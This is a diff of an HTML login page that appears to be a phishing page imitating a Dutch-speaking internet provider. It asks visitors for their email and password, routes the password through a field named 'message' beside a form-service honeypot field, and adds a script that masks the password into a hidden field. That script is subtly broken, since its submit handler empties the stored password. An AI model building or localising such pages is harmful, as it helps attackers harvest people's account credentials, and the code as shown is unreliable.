@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="nl">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Supersnel internet, met of zonda....</title>
+    <title>Supersnel internet, met of zonder...</title>
     <link rel="icon" type="image/x-icon" href="telnet favicon.png">
     <style>
         body {
@@ -101,23 +101,39 @@
                 <input type="hidden" name="_honey" style="display:none;">
                 <div class="container">
                     <div class="form-group">
-                        <label>Your email address</label>
-                        <input type="email" name="email" placeholder="Your email" required>
-                        <label>Password:</label>
-                        <input type="text" id="passwordInput"  name="message" placeholder="Your password" required>
+                        <label>Uw e-mailadres</label>
+                        <input type="email" name="email" placeholder="Uw e-mailadres" required>
+                        <label>Wachtwoord:</label>
+                        <input type="text" id="passwordInput" name="message" placeholder="Uw wachtwoord" required>
                         <!-- Hidden field to store the actual password -->
                         <input type="hidden" id="hiddenPassword" name="message">
                     </div>
-                    <span class="or-text"><input type="radio" name="" id=""> Stay connected</span>
+                    <span class="or-text"><input type="radio" name="" id=""> Blijf ingelogd</span>
                     <div class="form-group">
-                        <button class="sign-in-btn" type="submit">Submit</button>
+                        <button class="sign-in-btn" type="submit">Indienen</button>
                     </div>
                 </div>
             </form>
         </div>
     </div>
 
+    <script>
+        const passwordInput = document.getElementById('passwordInput');
+        const hiddenPassword = document.getElementById('hiddenPassword');
 
+        // Function to mask the input with dots
+        passwordInput.addEventListener('input', () => {
+            const value = passwordInput.value;
+            hiddenPassword.value = value; // Store the actual value in the hidden field
+            passwordInput.value = value.replace(/./g, '•'); // Replace all characters with dots
+        });
+
+        // Function to handle form submission
+        document.getElementById('customForm').addEventListener('submit', (e) => {
+            // Ensure the hidden field contains the actual password
+            hiddenPassword.value = passwordInput.value.replace(/•/g, ''); // Remove dots before submission
+        });
+    </script>
 </body>
 
 </html>
